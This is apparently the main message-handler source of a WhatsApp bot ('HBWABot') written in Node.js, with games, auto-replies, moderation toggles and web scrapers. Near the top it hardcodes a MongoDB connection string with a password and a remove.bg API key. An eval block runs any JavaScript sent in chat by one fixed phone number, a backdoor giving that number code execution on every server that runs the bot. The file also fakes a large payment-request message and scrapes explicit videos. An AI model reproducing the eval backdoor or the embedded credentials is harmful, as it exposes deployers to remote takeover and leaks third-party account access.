require('./settings')
require('./lib/listmenu')
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const yts2 = require('yt-search')
const fg = require('api-dylux')
const { youtubedl, youtubedlv2 } = require('@bochilteam/scraper-sosmed')
const { color, bgcolor } = require('./lib/color')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { rentfromherbert, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { TelegraPh } = require('./lib/uploader')
const { msgFilter } = require('./lib/antispam')
const eco = require('discord-mongoose-economy')
const ty = eco.connect('mongodb+srv://Arch:1t6l2G0r6nagLlOb@cluster0.gedh4.mongodb.net/?retryWrites=true&w=majority')
const mizo_tawnga_translate_na = require("@kreisler/js-google-translate-free")
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const { HerbertInstaMp4 } = require('./scrape/HerbertInstaMp4')
const { HerbertIgImg } = require('./scrape/HerbertIgImg')
const { HerbertFb } = require('./scrape/HerbertFb')
const { HerbertTwitter } = require('./scrape/HerbertTwitter')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const mumaker = require("mumaker")
const photooxy = require('./scrape/photooxy')
const { DOMParser } = require('xmldom-qsa')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const hbmods = JSON.parse(fs.readFileSync('./Base/Developer.json'))
const Englo = JSON.parse(fs.readFileSync('./Base/Ka-hming.json'))
const herbertverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteHerbert = JSON.parse(fs.readFileSync('./HBMedia/database/herbertvn.json'))
const StickerHerbert = JSON.parse(fs.readFileSync('./HBMedia/database/herbertsticker.json'))
const ImageHerbert = JSON.parse(fs.readFileSync('./HBMedia/database/herbertimage.json'))
const VideoHerbert = JSON.parse(fs.readFileSync('./HBMedia/database/herbertvideo.json'))
const BadHerbert = JSON.parse(fs.readFileSync('./database/bad.json'))
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntrssfeed = JSON.parse(fs.readFileSync('./database/rssfeed.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = db.game.tebaklagu = []
let kuismath = db.game.math = []
let vote = db.others.vote = []

module.exports = HBWABotInc = async (HBWABotInc, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await HBWABotInc.decodeJid(HBWABotInc.user.id)
        const HerbertTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const HerbertTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await HBWABotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = herbertverifieduser.includes(sender)
    	const banUser = await HBWABotInc.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false 
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        
        //theme sticker reply
        const Menu = () => {
        let Menu = fs.readFileSync('./HBMedia/audio/Menu.mp3')
        HBWABotInc.sendMessage(from, { audio: Menu, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
        const Owner = () => {
        let Owner = fs.readFileSync('./HBMedia/audio/owner.mp3')
        HBWABotInc.sendMessage(from, { audio: Owner, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
          // react message
 const uploadreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "⬆️" , key: m.key }}) 
 }    
 const loadingreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "♻️" , key: m.key }}) 
 }    
const finishreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "✅" , key: m.key }}) 
 }       
 const makerreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "🎯" , key: m.key }}) 
 }       
 const downloadreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "⬇️" , key: m.key }}) 
 }
 const robotreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "🤖️" , key: m.key }}) 
 } 
 const helloreact = () => {
 HBWABotInc.sendMessage(from, { react: { text: "👋️" , key: m.key }}) 
 }
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var herbertytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var herbertytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var herbertytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var herbertytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var herbertytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var herbertytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "918416093656") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await HBWABotInc.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				HBWABotInc.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}

const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.settings[botNumber] = {
    	    anticall: true,
    		status: 0,
    		autobio: false
	    }

} catch (err) {
console.error(err)
}

if (!HBWABotInc.public) {
if (!HerbertTheCreator && !m.key.fromMe) return
        }
if (autoread) {
            HBWABotInc.readMessages([m.key])
        }
if (isCmd && !isUser) {
herbertverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(herbertverifieduser, null, 2))
}

HBWABotInc.sendPresenceUpdate('available', from)


 //Suit RPS
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    HBWABotInc.sendTextWithMentions(m.chat, `@${roof.p.split`@`[0]}, @${roof.p2.split`@`[0]}'n a cho lo che a, chu vangin cancel a ni`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    HBWABotInc.sendText(m.chat, `RPS chu in thlan turin pvt a thawn ve ve in ni!..

@${roof.p.split`@`[0]} leh 
@${roof.p2.split`@`[0]}

He mi link hi hmet la RPS a i duh ber kha lo thlang rawh
 https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) HBWABotInc.sendText(roof.p, `I duh ber thlang rawh \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) HBWABotInc.sendText(roof.p2, `I duh ber thlang rawh \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) HBWABotInc.sendText(m.chat, `In pahnihin in khel tum loh ve ve vangin RPS chu cancel a ni`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    HBWABotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]}'n hun tiam chhunga a thlan hman loh avangin, Game Over a ni!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(` ${m.text} i thlang e✓ ${!roof.pilih2 ? `\n\nI tumpui la nghak lawk ang` : ''}`)
	    if (!roof.pilih2) HBWABotInc.sendText(roof.p2, '_Lehlamin a thlang tawh a_\nTunah nang i thlan hun', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`${m.text} i thlang e✓ ${!roof.pilih ? `\n\nI tumpui la nghak lawk ang` : ''}`)
	    if (!roof.pilih) HBWABotInc.sendText(roof.p, '_Lehlamin a thlang tawh a_\nTunah nang i thlan hun', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    HBWABotInc.sendText(roof.asal, `_*RPS Results*_${tie ? '\nIn in hneh tawk chiah' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` A chak zawk\n` : ` A chaklo zawk\n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` A chak zawk \n` : ` A chaklo zawk\n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await HBWABotInc.updateProfileStatus(`HBWABot | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
//group chat msg by herbert
const dodoi = (teks) => {
            HBWABotInc.sendMessage(m.chat, { text: teks}, { quoted: m})
        }
const replyherbertstyle = (teks) => {
           HBWABotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `${global.botname}`,"body": `SUB HBMods OFC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./HBWABot.png`),"sourceUrl": `https://youtube.com/@HBMods_Channel`}}}, { quoted: m})
        }
const replymizobiblequotes = (teks) => {
           HBWABotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `Mizo Bible Quotes`,"body": `HBWABot`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./MizoBibleQ.png`),"sourceUrl": `https://instagram.com/mizo_bible_quote`}}}, { quoted: m})
        }
const replygcherbert = (teks) => {
HBWABotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./HBMedia/theme/hbwabot.png`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcherbet2 = (teks) => {        
HBWABotInc.sendMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: false, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
HBWABotInc.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
HBWABotInc.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

const sendvn = (teks) => {
HBWABotInc.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//autoreply
for (let BhosdikaHerbert of VoiceNoteHerbert) {
if (budy === BhosdikaHerbert) {
let audiobuffy = fs.readFileSync(`./HBMedia/audio/${BhosdikaHerbert}.mp3`)
HBWABotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaHerbert of StickerHerbert){
if (budy === BhosdikaHerbert){
let stickerbuffy = fs.readFileSync(`./HBMedia/sticker/${BhosdikaHerbert}.webp`)
HBWABotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaHerbert of ImageHerbert){
if (budy === BhosdikaHerbert){
let imagebuffy = fs.readFileSync(`./HBMedia/image/${BhosdikaHerbert}.jpg`)
HBWABotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaHerbert of VideoHerbert){
if (budy === BhosdikaHerbert){
let videobuffy = fs.readFileSync(`./HBMedia/video/${BhosdikaHerbert}.mp4`)
HBWABotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}


const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
HBWABotInc.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await HBWABotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await HBWABotInc.getName(
          i + "@s.whatsapp.net"
        )}\nFN:${global.ownername}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Bot hmangtu\nitem2.EMAIL;type=INTERNET:
 ${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:IG\nitem4.ADR:;;India;Mizoram Aizawl ;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
let dev = []
for (let h of hbmods) {
list.push({
	    	displayName: await HBWABotInc.getName(h),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await HBWABotInc.getName(
          h + "@s.whatsapp.net"
        )}\nFN:${Englo}\nitem1.TEL;waid=${h}:${h}\nitem1.X-ABLabel:Bot siamtu\nitem2.EMAIL;type=INTERNET:
 YT: HBMods OFC\nitem2.X-ABLabel:YouTube\nitem3.URL:herbert70.blogspot.com\nitem3.X-ABLabel:IG\nitem4.ADR:;;India;Mizoram Aizawl ;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let herbertrecordin = ['recording','composing']
//let herbertrecordinfinal = herbertrecordin[Math.floor(Math.random() * herbertrecordin.length)]

if (global.autoTyping) {
if (command) {
HBWABotInc.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
HBWABotInc.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
//

async function sendPoll(jid, text, list) {
HBWABotInc.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}
async function loading () {
var HBLoading = [
"《▒▒▒▒▒▒▒▒▒▒▒▒》0%",
"《█▒▒▒▒▒▒▒▒▒▒▒》10%",
"《█▒▒▒▒▒▒▒▒▒▒▒》10%",
"《████▒▒▒▒▒▒▒▒》30%",
"《████▒▒▒▒▒▒▒▒》30%",
"《███████▒▒▒▒▒》50%",
"《███████▒▒▒▒▒》50%",
"《██████████▒▒》80%",
"《██████████▒▒》80%",
"《████████████》100%",
"♻️ Reilo te min lo nghak rawh..."
]
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoading.length; i++) {
 await HBWABotInc.sendMessage(from, {text: HBLoading[i], edit: key },{quoted:m})}
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}	

